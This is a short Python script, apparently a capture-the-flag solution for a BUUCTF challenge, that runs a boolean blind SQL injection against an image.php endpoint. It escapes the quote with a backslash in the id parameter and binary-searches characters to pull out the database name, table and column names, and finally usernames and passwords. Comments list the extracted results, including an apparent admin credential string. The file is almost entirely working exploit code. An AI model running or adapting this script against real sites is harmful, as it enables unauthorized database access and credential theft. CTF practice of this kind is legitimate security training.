# -*- coding: UTF-8 -*-
# 颜值注入
import time

import requests

url = r"http://e9a5ab4f-b426-4cac-a379-e5ebb1a00ee3.node4.buuoj.cn:81/image.php?id=\\0&path="

payload1 = "%20or(ascii(substr((select(database())),{},1))>{})%23"
# payload2 = "   or(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>{})%23"
payload2 = "or(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>{})%23"
payload3 = "or(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),{},1))>{})%23"
payload4 = "or(ascii(substr((select(group_concat(username,password))from(users)),{},1))>{})%23"
flag = ""

for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload = payload4.format(x, mid)
        new_url = url + playload
        print(new_url)
        r = requests.get(new_url)
        # print(r)
        if "JFIF" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    flag += chr(mid)
    print(flag)
    time.sleep(1)

print(flag)
# ciscnfinal
# images,users
# username,password
# admin327964752dd049bb9313
# 单引号被过滤
